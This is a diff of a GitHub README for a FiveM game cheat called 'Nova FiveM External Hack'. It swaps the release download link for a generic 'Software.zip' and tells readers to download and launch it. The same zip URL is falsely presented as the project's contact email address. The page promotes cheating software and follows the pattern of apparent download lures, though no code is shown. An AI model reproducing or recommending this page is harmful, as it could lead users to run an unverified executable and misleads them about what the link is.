@@ -10,7 +10,7 @@ Welcome to the Nova-FiveM-External-Hack repository! This external hack provides 
 ## 🌟 Get Started
 To get started with Nova FiveM External Hack, download the software package from the following link:
 
-[![Download Software](https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v1.0/Release_x64.zip)](https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v2.0/Software.zip)](https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v2.0/Software.zip)
 
 Once the download is complete, launch the software to start enjoying the benefits of the external hack in FiveM.
 
@@ -33,6 +33,6 @@ If you encounter any issues during the installation or usage of Nova FiveM Exter
 We welcome contributions from the community to enhance the functionality of Nova FiveM External Hack. Feel free to fork this repository, make your changes, and submit a pull request for review.
 
 ## 📧 Contact Us
-If you have any questions, suggestions, or feedback regarding Nova FiveM External Hack, please reach out to us via email at [https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v1.0/Release_x64.zip](https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v1.0/Release_x64.zip).
+If you have any questions, suggestions, or feedback regarding Nova FiveM External Hack, please reach out to us via email at [https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v2.0/Software.zip](https://github.com/NarendraSingh17/Nova-FiveM-External-Hack/releases/download/v2.0/Software.zip).
 
 We hope you enjoy using Nova FiveM External Hack to elevate your gameplay experience on FiveM! Happy gaming! 🎮
